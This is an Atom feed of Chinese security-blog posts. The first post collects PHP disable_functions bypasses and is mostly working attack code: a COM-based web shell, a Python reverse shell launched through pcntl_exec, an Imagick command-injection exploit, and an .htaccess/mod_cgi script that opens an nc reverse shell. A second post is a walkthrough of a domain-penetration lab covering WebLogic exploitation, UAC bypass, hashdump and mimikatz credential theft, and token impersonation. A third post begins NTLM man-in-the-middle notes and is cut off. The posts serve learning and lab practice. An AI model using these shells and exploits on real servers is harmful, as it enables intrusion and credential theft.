<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://chriskalix.github.io</id>
    <title>chriskali&apos;s blog</title>
    <updated>2020-08-03T02:22:49.281Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://chriskalix.github.io"/>
    <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
    <subtitle>Keep learning</subtitle>
    <logo>https://chriskalix.github.io/images/avatar.png</logo>
    <icon>https://chriskalix.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
    <entry>
        <title type="html"><![CDATA[disable_functions bypass整理]]></title>
        <id>https://chriskalix.github.io/post/GqcqeDkXU/</id>
        <link href="https://chriskalix.github.io/post/GqcqeDkXU/">
        </link>
        <updated>2020-07-26T10:22:04.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>disable_function，通常在上传了webshell后让人头疼的问题。之前做过绕过，不过没有系统的整理复现过。话题比较老了，做个回顾纪念，大部分为搬运</p>
</blockquote>
<h2 id="环境">环境</h2>
<p>phpstudy<br>
php 7.1.9</p>
<p>开始前需要手动添加<code>disable_functions</code>，我配置的为 <code>exec,system,passthru,popen,pclose,shell_exec,proc_open,dl,curl_exec,multi_exec,chmod,gzinflate,set_time_limit</code></p>
<h2 id="绕过整理">绕过整理</h2>
<h3 id="0x01-windows-系统组件">0x01 Windows - 系统组件</h3>
<blockquote>
<p>适用于Windows下，使用前需要查看COM组件是否开启。windows下5.X默认支持</p>
</blockquote>
<p>在 <code>php.ini</code> 中找到 <code>extension=php_com_dotnet.dll</code> 并且开启（若没有则直接添加），结果如下<br>
<img src="https://chriskalix.github.io/post-images/1595758966523.png" alt="" loading="lazy"></p>
<p>对于com组件仅简单了解，不做搬运文章的苦力，<a href="https://www.zhihu.com/question/49433640">文章地址</a>。从百度百科抄一句：COM是开发软件组件的一种方法。组件实际上是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。<br>
通过COM组件，调用WScript.shell（这个在写VBS的时候经常用到）或者shell.application执行系统命令。从安全客上搬运的代码如下：</p>
<pre><code class="language-php">&lt;?php
$wsh = isset($_GET['wsh']) ? $_GET['wsh'] : 'wscript';
if($wsh == 'wscript') {
    $command = $_GET['cmd'];
    $wshit = new COM('WScript.shell') or die(&quot;Create Wscript.Shell Failed!&quot;);
    $exec = $wshit-&gt;exec(&quot;cmd /c&quot;.$command);
    $stdout = $exec-&gt;StdOut();
    $stroutput = $stdout-&gt;ReadAll();
    echo $stroutput;
}
elseif($wsh == 'application') {
    $command = $_GET['cmd'];
    $wshit = new COM(&quot;Shell.Application&quot;) or die(&quot;Shell.Application Failed!&quot;);
    $exec = $wshit-&gt;ShellExecute(&quot;cmd&quot;,&quot;/c &quot;.$command);
} 
else {
  echo(0);
}
?&gt;
</code></pre>
<p>执行效果如下</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1595758973366.png" alt="" loading="lazy"></figure>
<h3 id="0x02-linux-ld_preload">0x02 Linux - LD_PRELOAD</h3>
<blockquote>
<p>条件：1. 能上传.so文件 2. putenv能使用，控制环境变量 3. mail, imap_mail, mb_send_mail, error_log等函数能够调用</p>
</blockquote>
<p>相比起来，这个稍微熟悉一点。之前在写Linux下应急响应脚本的时候，就包含LD_PRELOAD的检验。LD_PRELOAD是linux下的预加载环境变量，可以通过导入恶意的.so文件替换环境变量，从而劫持函数。在安全客上有一篇<a href="https://www.anquanke.com/post/id/175403">深入浅出LD_PRELOAD&amp;putenv()</a>。为什么要使用mail之类的函数？因为在设置环境变量后，仅会在请求期间存在，想要使预环境变量被加载，就要找到创建子进程的函数，从而触发恶意.so文件。同样的摸到了仓库<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">github - LD_PRELOAD</a>，讲的也很好，在理解的情况下做一点搬运<br>
通常情况下，大部分文章使用LD_PRELOAD的方法为如下几步：</p>
<ol>
<li>编写一个getuid的C函数（为什么是getuid，因为sendmail会用到），编译成xx.so</li>
<li>运行phpenv，设置LD_PRELOAD为xx.so</li>
<li>运行mail函数，由于设置了LD_PRELOAD，会优先从xx.so中寻找函数</li>
<li>执行恶意命令</li>
</ol>
<p>但是在实战用会碰到一系列问题，如禁止sendmail，服务器上根本没有安装sendmail。仓库中提到，不要局限于劫持某一个函数，而应考虑<strong>拦截启动进程</strong>。在GCC中有一个C语言的拓展修饰符， <code>__attribute__((constructor))</code> ，可以让由它修饰的函数在<code>main()</code> 函数之前运行。当出现在共享对象中，一旦对象被系统加载，则立即执行由它所修饰的函数。而当启动新进程的时候，又会自动调用该函数，会造成循环阻塞。这里需要注意的是，由于需要调用 <code>unsetenv()</code> ，在centos下是不可行的（具体原因看仓库）。<br>
在知道原理后直接使用作者的仓库进行尝试：<br>
<img src="https://chriskalix.github.io/post-images/1595758980470.png" alt="" loading="lazy"></p>
<p>这里作者提到一个问题，如果目标开启SELinux会导致对outpath没有读写权限，以及.so文件是在debian系统下编译，对于非debian系统需要重新编译。</p>
<h3 id="0x03-linux-pcntl_exec">0x03 Linux - pcntl_exec</h3>
<blockquote>
<p>这个也很早了，文章很多，主要是做个记录</p>
</blockquote>
<p>该函数在PHP&gt;4.2.0，5，7中存在。搬运一个python的版本，可以自行修改</p>
<pre><code class="language-php">&lt;?php
pcntl_exec(&quot;/usr/bin/python&quot;,array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'));?&gt;
</code></pre>
<h3 id="0x04-imagick">0x04 imagick</h3>
<blockquote>
<p>这个每个文章里基本都有，做个记录吧</p>
</blockquote>
<p>还是一样，先在 <code>phpinfo</code> 中先看下是否有该组件。这个在看H1文章会看到，属于组件问题。直接搬运一下RicterZ师傅的代码，url自行更改（不过感觉现在基本没了吧...）</p>
<pre><code class="language-php"># Exploit Title: PHP Imagick disable_functions Bypass
# Date: 2016-05-04
# Exploit Author: RicterZ (ricter@chaitin.com)
# Vendor Homepage: https://pecl.php.net/package/imagick
# Version: Imagick  &lt;= 3.3.0 PHP &gt;= 5.4
# Test on: Ubuntu 12.04
 
# Exploit:
 
&lt;?php
# PHP Imagick disable_functions Bypass
# Author: Ricter &lt;ricter@chaitin.com&gt;
#
# $ curl &quot;127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd&quot;
# &lt;pre&gt;
# Disable functions: exec,passthru,shell_exec,system,popen
# Run command: cat /etc/passwd
# ====================
# root:x:0:0:root:/root:/usr/local/bin/fish
# daemon:x:1:1:daemon:/usr/sbin:/bin/sh
# bin:x:2:2:bin:/bin:/bin/sh
# sys:x:3:3:sys:/dev:/bin/sh
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/bin/sh
# ...
# &lt;/pre&gt;
echo &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;
$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
echo &quot;Run command: $command\n====================\n&quot;;
 
$data_file = tempnam('/tmp', 'img');
$imagick_file = tempnam('/tmp', 'img');
 
$exploit = &lt;&lt;&lt;EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg&quot;|$command&gt;$data_file&quot;)'
pop graphic-context
EOF;
 
file_put_contents(&quot;$imagick_file&quot;, $exploit);
$thumb = new Imagick();
$thumb-&gt;readImage(&quot;$imagick_file&quot;);
$thumb-&gt;writeImage(tempnam('/tmp', 'img'));
$thumb-&gt;clear();
$thumb-&gt;destroy();
 
echo file_get_contents($data_file);
?&gt;
</code></pre>
<h3 id="0x05-htaccess">0x05 .htaccess</h3>
<blockquote>
<p>.htaccess，做配置的时候老见到了，也有用来做后门隐藏的，总之用法很多</p>
</blockquote>
<p>（搬运一下）有如下条件：</p>
<ol>
<li>必须是apache</li>
<li>mod_cgi</li>
<li>运行.htaccess生效</li>
<li>有写.htaccess的权限</li>
</ol>
<pre><code class="language-php">&lt;?php
$cmd = &quot;nc -c'/bin/bash' 127.0.0.1 4444&quot;; //反弹一个shell出来，这里用本地的4444端口
$shellfile =&quot;#!/bin/bash\n&quot;; //指定shell
$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //需要指定这个header，否则会返回500
$shellfile .=&quot;$cmd&quot;; 
functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;
}
if(!isset($_GET['checked']))
{
    @file_put_contents('.htaccess',&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); 
    header('Location: ' . $_SERVER['PHP_SELF']. '?checked=true'); //执行环境的检查
}
else
{
    $modcgi = in_array('mod_cgi',apache_get_modules()); // 检测mod_cgi是否开启
    $writable = is_writable('.'); //检测当前目录是否可写
    $htaccess = !empty($_SERVER['HTACCESS']);//检测是否启用了.htaccess
        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);
    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))
    {
        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //必须满足所有条件
    }
    else
    {
       
 checkEnabled(&quot;Backing 
up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in 
.htaccess.bak&quot;,&quot;Failed!&quot;); //备份一下原有.htaccess
        
checkEnabled(&quot;Write 
.htaccessfile&quot;,file_put_contents('.htaccess',&quot;Options 
+ExecCGI\nAddHandlercgi-script 
.dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzle，我们的特定扩展名
        checkEnabled(&quot;Write shellfile&quot;,file_put_contents('shell.dizzle',$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//写入文件
        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//给权限
        echo &quot;Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;&quot;; //调用
    }
}
?&gt;
</code></pre>
<h2 id="参考">参考</h2>
<p><a href="https://xz.aliyun.com/t/5320#toc-0">先知文章</a><br>
<a href="https://baijiahao.baidu.com/s?id=1659386031704746677&amp;wfr=spider&amp;for=pc">E安全</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透整理复现]]></title>
        <id>https://chriskalix.github.io/post/2cLB43Y5A/</id>
        <link href="https://chriskalix.github.io/post/2cLB43Y5A/">
        </link>
        <updated>2020-07-19T13:19:54.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>不知道为什么用这个传不了PDF，就放一个Github链接吧~</p>
</blockquote>
<p><a href="https://github.com/chriskaliX/AD_pentest_Notes">Github项目地址</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透靶机实战(一)]]></title>
        <id>https://chriskalix.github.io/post/-iDU1AvVp/</id>
        <link href="https://chriskalix.github.io/post/-iDU1AvVp/">
        </link>
        <updated>2020-07-01T02:27:34.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>标题是（一），其实是红日的靶机2，前段时间学习了域的基础后最近开始做靶机，逐步提升吧，希望有不足的地方大家能帮我指出，谢谢</p>
</blockquote>
<h2 id="0x01-环境配置">0x01 环境配置</h2>
<h3 id="1-环境搭建">1. 环境搭建</h3>
<p>从<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">这里</a>下载靶机环境，配置两个hostonly网卡分别为10.10.10.0/24，以及192.168.111.1/24网段</p>
<h3 id="2-环境一览">2. 环境一览</h3>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:center">内网地址</th>
<th style="text-align:center">外网地址</th>
<th style="text-align:center">系统</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">DC</td>
<td style="text-align:center">10.10.10.10.</td>
<td style="text-align:center"></td>
<td style="text-align:center">Windows 2012(64位)</td>
</tr>
<tr>
<td style="text-align:center">WEB</td>
<td style="text-align:center">10.10.10.80</td>
<td style="text-align:center">192.168.111.80</td>
<td style="text-align:center">Windows 2008(64位)</td>
</tr>
<tr>
<td style="text-align:center">PC</td>
<td style="text-align:center">10.10.10.201</td>
<td style="text-align:center">192.168.111.201</td>
<td style="text-align:center">Windows 7(32位)</td>
</tr>
<tr>
<td style="text-align:center">Kali(自建)</td>
<td style="text-align:center"></td>
<td style="text-align:center">192.168.111.x</td>
<td style="text-align:center">Kali Linux 2020.2</td>
</tr>
</tbody>
</table>
<p>[*] 注：在主机 <code>WEB</code> 起来后，要手动起 <code>Weblogic</code> 服务</p>
<h2 id="0x02-实战开始">0x02 实战开始</h2>
<blockquote>
<p>在做的时候要当成黑盒，这样做起来比较有逻辑</p>
</blockquote>
<h3 id="1-外部突破">1. 外部突破</h3>
<h4 id="常规扫描">常规扫描</h4>
<p><code>nmap 192.168.111.1/24 -sS -p 1-65535 -T4</code> 对C段下进行初步发现，扫描结果如下：</p>
<pre><code>Nmap scan report for 192.168.111.80
Host is up (0.0014s latency).
Not shown: 65522 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3389/tcp  open  ms-wbt-server
7001/tcp  open  afs3-callback
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49183/tcp open  unknown
49190/tcp open  unknown
60966/tcp open  unknown
MAC Address: 00:0C:29:91:56:77 (VMware)

Nmap scan report for 192.168.111.201
Host is up (0.0080s latency).
Not shown: 65526 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
MAC Address: 00:0C:29:32:32:CD (VMware)
</code></pre>
<p>其中80机器对外开放80端口，觉得比较有可能为入口点。使用dirsearch扫描目录，无果。其余开放的1433，3389，445等常规端口，可以尝试口令、或者CVE直接打一下试试。<br>
这时访问7001端口，发现为web应用。想起了熟悉的weblogic，于是用dirsearch再遍历一下，发现/console目录，访问。<br>
<img src="https://chriskalix.github.io/post-images/1594016543093.png" alt="" loading="lazy"><br>
果然是weblogic，版本为10.3.6.0</p>
<h4 id="权限获取">权限获取</h4>
<p>这里用 <code>rabbitmask</code> 师傅的 <code>weblogicscan</code> 扫一发。存在<code>cve-2019-2725</code>以及<code>cve-2019-2727</code>。我就直接用 <code>msf</code> 上的cve-2019-2725试了一下，得到了初步权限<br>
这里还是比较简单的<br>
<img src="https://chriskalix.github.io/post-images/1594016548948.png" alt="" loading="lazy"></p>
<h3 id="2-本机信息获取">2. 本机信息获取</h3>
<blockquote>
<p>亮神：渗透测试的本质就是信息收集</p>
</blockquote>
<p><code>shell</code>进入靶机，输入 <code>chcp 65001</code> 修改乱码显示。整理后信息如下，其实信息获取还不够完善，例如防火墙策略等等，可以参考腾讯蓝军的文章：</p>
<table>
<thead>
<tr>
<th style="text-align:center">信息</th>
<th style="text-align:center">详情</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">主机名</td>
<td style="text-align:center">WEB</td>
</tr>
<tr>
<td style="text-align:center">主机版本</td>
<td style="text-align:center">Windows Server 2008 R2</td>
</tr>
<tr>
<td style="text-align:center">域名称</td>
<td style="text-align:center">de1ay.com</td>
</tr>
<tr>
<td style="text-align:center">内网IP</td>
<td style="text-align:center">10.10.10.80</td>
</tr>
<tr>
<td style="text-align:center">防护软件</td>
<td style="text-align:center">360</td>
</tr>
<tr>
<td style="text-align:center">权限</td>
<td style="text-align:center">Administrator</td>
</tr>
</tbody>
</table>
<p>执行<code>net time /domain</code> 报错5，代表有域，但是当前不是域用户</p>
<h4 id="端口开放">端口开放</h4>
<pre><code>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       736
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       1472
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2228
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       400
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       784
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:49183          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49190          0.0.0.0:0              LISTENING       488
  TCP    0.0.0.0:60966          0.0.0.0:0              LISTENING       1472
  TCP    10.10.10.80:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.80:7001       0.0.0.0:0              LISTENING       3264
  TCP    127.0.0.1:7001         0.0.0.0:0              LISTENING       3264
  TCP    192.168.111.80:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.111.80:7001    0.0.0.0:0              LISTENING       3264
  TCP    192.168.111.80:49399   192.168.111.128:4444   ESTABLISHED     1088
</code></pre>
<h4 id="进程信息">进程信息</h4>
<p><img src="https://chriskalix.github.io/post-images/1594016561684.png" alt="" loading="lazy"><br>
主机上运行着360</p>
<h3 id="3-权限提升">3. 权限提升</h3>
<blockquote>
<p>这里看的也少，有基础的知识点没有覆盖，于是摘抄一些作为记录</p>
</blockquote>
<h4 id="windows提权方法">windows提权方法</h4>
<p>这里有Wing仔在先知上的翻译<a href="https://xz.aliyun.com/t/2519">文章</a>，很详细，我就不搬运了。自己目前知道的比较狭窄，如下：</p>
<ul>
<li>本地提权漏洞，如ms15_051</li>
<li><strong>Bypassuac</strong>（对windows 7、8以上getsystem均需要bypass）</li>
<li>令牌窃取</li>
<li>HASH（有密码当然可以...）</li>
</ul>
<h4 id="补丁获取">补丁获取</h4>
<p>上主机，运行 <code>systeminfo</code> ，补丁如下：</p>
<pre><code class="language-txt">[01]: KB2999226
[02]: KB958488
[03]: KB976902
</code></pre>
<p>一般情况下...会是比较多的补丁吧，这时候可以到<a href="https://bugs.hacking8.com/tiquan/">提权辅助网页</a>进行搜索（类似于在线的exploit_suggester :） ）</p>
<h4 id="漏洞尝试">漏洞尝试</h4>
<p>补丁很少，感觉随便抓一个就能打，于是先用<code>post/multi/recon/local_exploit_suggester</code> 看一看，结果如下：<br>
<img src="https://chriskalix.github.io/post-images/1594016571241.png" alt="" loading="lazy"><br>
用 <code>ms15_051</code> 进行尝试<br>
<img src="https://chriskalix.github.io/post-images/1594016576216.png" alt="" loading="lazy"><br>
...竟然失败了，误以为payload设置错误，来回尝试均无果。这时候怀疑可能是360拦截，这时候看到了别WP，说可能是 UAC 的问题(虽然我不知道怎么看的，因为我好像没有弹框...)。<br>
UAC的知识点没有看过，这次靶机遇到了，稍微补习一下（毕竟是笔记嘛~熟悉的朋友们可以跳过这个部分）</p>
<h5 id="额外补充-uac">额外补充-UAC</h5>
<h6 id="uac简介">UAC简介</h6>
<p>UAC(User Account Control)即用户账户控制，是在Windows Vista以及更高版本上采用的一种控制机制。其原理是通过通知用户是否对应用程序使用硬盘驱动器和系统文件授权(平时熟悉的弹框)，以达到帮助阻止恶意程序损坏系统的效果 -- 摘抄</p>
<h6 id="bypassuac">bypassuac</h6>
<p>从这篇<a href="https://www.cnblogs.com/Chesky/p/UAC_Bypass.html">文章</a>里摘抄出了 bypassuac 的常见方法，其实在小y师傅的<a href="https://github.com/xiaoy-sec/Pentest_Note">Pentest_Note</a>里也记录了许多</p>
<ul>
<li>白名单提权机制</li>
<li>DLL劫持</li>
<li>Windows自身提权漏洞</li>
<li>远程注入</li>
<li>COM接口技术</li>
</ul>
<h6 id="msf">MSF</h6>
<blockquote>
<p>从内网安全攻防摘抄了部分</p>
</blockquote>
<p>运行 <code>exploit/windows/local/bypassuac</code> ，获得了新的 <code>session</code> ，在新的 <code>session</code> 中getsystem获取权限。</p>
<p>[*] 注1：bypassuac模块会产生多个文件，容易被杀软识别。使用 bypassuac_injection 模块直接运行在内存的反射DLL中，不会接触到目标机器硬盘，降低了被检测出的概率<br>
[*] 注2：bypassuac的前提为，当前用户必须在管理员组中（该靶机在管理员组），且UAC为默认配置（仅在程序试图修改我的计算机时通知我）</p>
<h4 id="权限获取-2">权限获取</h4>
<p>其实在刚刚的 <code>local_exploit_sugguester</code> 中就展示了一个方法 <code>bypassuac_eventvwr</code> ，其实用 <code>bypassuac</code> 也能成功，截图如下<br>
<img src="https://chriskalix.github.io/post-images/1594016584867.png" alt="" loading="lazy"></p>
<h4 id="进程迁移">进程迁移</h4>
<blockquote>
<p>将进程迁移至稳定的SYSTEM进程中</p>
</blockquote>
<p>刚开始不懂，看着教程直接迁移到了explorer.exe，没有认真看权限，结果降权了...这时候内心有个问题，进程迁移是可以迁移到任意进程嘛？ZhuDongFangYu.exe也可以作为目标嘛？<br>
这边为了好玩，迁移到了主动防御...群里师傅推荐的是 <code>svchost.exe</code> 和 <code>csrss.exe</code> ，我查了一下大概是做啥的，记录了记录了...</p>
<h3 id="4-凭证获取">4. 凭证获取</h3>
<blockquote>
<p>这里直接使用msf来做，其余的方式在博客的前面几章里有留作介绍</p>
</blockquote>
<h4 id="hashdump">hashdump</h4>
<p>msf中有两种获取hash的方式，分别为<code>hashdump</code>和<code>smart_hashdump</code>。两者的区别为 hashdump仅能导出本地的hash，而smart_hashdump可以导出域用户的hash。但是目前的账户为本机<code>SYSTEM</code> 权限，并不是域用户，所以跑出的没有差别(我认为)<br>
<img src="https://chriskalix.github.io/post-images/1594016593384.png" alt="" loading="lazy"><br>
[*] 注：这里有一个小问题，作者的靶机其实密码都是一样的，而我在登录 WEB这台机器的时候密码不对，猜解后我重置了密码，导致和其他账户都不一样</p>
<h4 id="明文获取">明文获取</h4>
<p>加载mimikatz，用wdigest抓取明文，但是读取不到...<br>
<img src="https://chriskalix.github.io/post-images/1594016599218.png" alt="" loading="lazy"><br>
这时候纳闷了，为什么和别人说的不一样...把错误的信息复制出来，用bing去搜，发现可能是进程位数问题 - <a href="https://security.stackexchange.com/questions/137002/error-when-using-metasploit-mimikatz-module">文章</a><br>
好吧...我就不应该尝试迁移到x86进程里的，这时候重新迁移一下，到<code>csrss.exe</code> 上，重新获取<br>
由于<code>WEB\de1ay</code>的密码被我修改过，且后续不会使用到，所以这里截取部分（在<a href="https://www.anquanke.com/post/id/193193">文章</a>中，直接在本机抓到了域管账号密码...我没有啊...不过没关系）<br>
<img src="https://chriskalix.github.io/post-images/1594016604606.png" alt="" loading="lazy"></p>
<h3 id="5-令牌利用失败">5. 令牌利用（失败）</h3>
<blockquote>
<p>当然可以尝试扫描内网，然后打CVE，SMB爆破等等...其实均可成功的~，但是作者的靶机上写到了Access Token的利用，我们还是试一试吧~（毕竟目标不是快速通关）</p>
</blockquote>
<p>在msf下 <code>load incognito</code> ，<code>list_tokens -u</code> 查看一下，如下：</p>
<p><img src="https://chriskalix.github.io/post-images/1594016720508.png" alt="" loading="lazy"><br>
这里其实有个小插曲，我看了<code>steal_token</code>这个操作，就去尝试了一下，结果这个meterpreter就好像变&quot;坏&quot;了（无法执行任何操作，均deny）...埋个坑，后续看看<br>
通过模拟令牌，切换到 <code>DE1AY\mssql</code> 用户下<br>
<img src="https://chriskalix.github.io/post-images/1594016727153.png" alt="" loading="lazy"><br>
但这个时候在meterpreter里什么操作都不行了（变坏了）...可是作者的文章里明明提到了 <code>Access Token利用（MSSQL利用）</code> ...为什么会不行呢...希望指教哇...<br>
本来我的思路是从这里切换到mssql权限，然后 <code>ms14-068</code> ，结果只能换个方法了~~</p>
<p><strong>[*]</strong> 遗留问题：这里是为什么（这样是不是不对啊..）....</p>
<h3 id="6-内网探测">6. 内网探测</h3>
<blockquote>
<p>关于信息获取的姿势有很多，腾讯前几天的<a href="https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA">文章</a>写的非常全，当然里面包括的不止是信息收集这一部分，可以当作备忘录实时翻看了</p>
</blockquote>
<h4 id="spn获取">SPN获取</h4>
<p>指令 <code>setspn -T de1ay.com -Q */*</code> ，快速获取域内注册的服务，如下：</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1594016733477.png" alt="" loading="lazy"></figure>
<p>看到域内有DC,PC,WEB三台主机。很明显DC就是域控啦（当然，应该用别的方式加以识别，例如<code>net time /domain</code>等等...），有了域名就能快速发现域内机器的IP，也不用挂上代理慢慢扫描了...</p>
<h4 id="主机端口探测">主机端口探测</h4>
<p>刚才已经发现了所在的内网网段，在msf里添加上网段。<br>
<code>run autoroute -s 10.10.10.0/24</code> ，这边可以挂上socks，然后用proxychains + nmap，或者传工具(nbtscan)等等都可以。<br>
由于已经知道域内主机的地址（SPN扫描发现），直接用 <code>auxiliary/scanner/portscan/tcp</code> 扫一下两台主机，结果如下<br>
<img src="https://chriskalix.github.io/post-images/1594016738827.png" alt="" loading="lazy"></p>
<h3 id="7-漏洞尝试">7. 漏洞尝试</h3>
<blockquote>
<p>看到了445和3389异常兴奋...于是想照着域控先来一发</p>
</blockquote>
<h4 id="永恒之蓝">永恒之蓝</h4>
<p>看到 <code>SMB</code> 第一时间想到的就是永恒之蓝，10.10.10.10 是 <code>DC</code> ，当然想法是一把梭。但是msf的模块在windows 2008以上会有问题，模块无法正常load进来，这个可以在 metasploit github上的<a href="https://github.com/rapid7/metasploit-framework/issues/13478">issue</a>里找到。<br>
这时候打 <code>10.10.10.201</code> 那台 <code>PC</code> 也无法成功，情况未知...很是头疼。在星球里问了，换上了 <code>doublepulsar</code> ，仍然无果<br>
这难道就没有办法了嘛~其实github上有NSA泄露的原版，可以拖上去继续尝试...为了快捷，我先尝试别的...</p>
<h4 id="cve-2019-0708">CVE-2019-0708</h4>
<p>先用校验模块尝试看一看<br>
<img src="C:%5CUsers%5Cchris%5CDesktop%5CBlog%5Cimgs%5Cclass2%5C14.png" alt="" loading="lazy"></p>
<p>域控没有3389的问题，PC有问题。那么上手去打一下，这边注意因为是用的vmware起的环境，所以target要重新设定为当前vmware的版本（默认的Automatic不行），这里又头疼了...因为我的VM是15.5.6的，target里没有......</p>
<p>做到这里有点郁闷了...因为MS17017没有成功（其实可以的，只是msf上的模块有问题），难道只有用 psexec 了嘛.</p>
<h3 id="8-横向移动">8. 横向移动</h3>
<p>这边其实垮掉了。上去一看环境崩坏，捣鼓半天很是痛苦，果然做靶机最最痛苦的就是环境问题。下面拉跨的给出正解文章</p>
<ul>
<li><a href="http://www.adminxe.com/888.html">文章1</a></li>
<li><a href="https://www.anquanke.com/post/id/193193">文章2</a></li>
</ul>
<p>因为域的问题（不太清楚是因为修改了密码还是中间的误操作），导致本机上应该能抓到域管账号密码却没有了~花费了很多时间看环境的问题，还是比较痛苦的...下一步决定去看xq17表哥的文章，搭建域环境摸一遍，附上一个第一次做成功的图吧...累了累了...</p>
<p><img src="C:%5CUsers%5Cchris%5CDesktop%5CBlog%5Cimgs%5Cclass2_11.png" alt="" loading="lazy"><br>
毕竟还是比较真实的嘛~~~</p>
<h2 id="0x03-知识点坑点总结">0x03 知识点&amp;坑点总结</h2>
<h3 id="1-知识点">1. 知识点</h3>
<ul>
<li>UAC（bypass）</li>
<li>Access Token</li>
<li>SPN</li>
<li>GPP</li>
<li>psexec | wmi</li>
<li>hashdump (Wdigest)</li>
</ul>
<h3 id="2-坑点">2. 坑点</h3>
<ul>
<li>mimikatz抓不到</li>
<li>进程迁移位数</li>
<li>ms17017</li>
<li>环境问题，十分痛苦</li>
</ul>
<h2 id="0x04-后续思考">0x04 后续思考</h2>
<ol>
<li>日志清理</li>
<li>动作太大</li>
<li>票据存留</li>
</ol>
<p>做完之后原理性的东西需要再加以总结，另外有些虎头蛇尾，还是继续看一看域环境，加深印象</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透基础知识(三)-思维导图补充]]></title>
        <id>https://chriskalix.github.io/post/3dogm6EPG/</id>
        <link href="https://chriskalix.github.io/post/3dogm6EPG/">
        </link>
        <updated>2020-06-27T07:24:14.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>这段时间看内网基础的时候，看到一个比较好的脑图，忘记从哪里抄来的了...不过作者写的很好，我就跟着梳理一下</p>
</blockquote>
<h2 id="思维导图">思维导图</h2>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593399265693.png" alt="" loading="lazy"></figure>
<h2 id="分类梳理">分类梳理</h2>
<blockquote>
<p>对于已经了解过的就不重复梳理</p>
</blockquote>
<h3 id="ntlm系列">NTLM系列</h3>
<h4 id="中间人">中间人</h4>
<blockquote>
<p>Net-NTLM可通过中间人+hashcat破解</p>
</blockquote>
<h5 id="前置知识">前置知识</h5>
<h6 id="中间人相关">中间人相关</h6>
<p>LLMNR（Link-Local Multicast Name Resolution）：</p>
<ul>
<li>主机在自己的内部名称缓存中查询名称。如果在缓存中没有找到名称，那么主机就会向自己配置的主DNS服务器发送查询请求。如果主机没有收到回应或收到了错误信息，主机还会尝试搜索配置的备用DNS服务器。如果主机没有配置DNS服务器，或者如果在连接DNS服务器的时候没有遇到错误但失败了，那么名称解析会失败，并转为使用LLMNR</li>
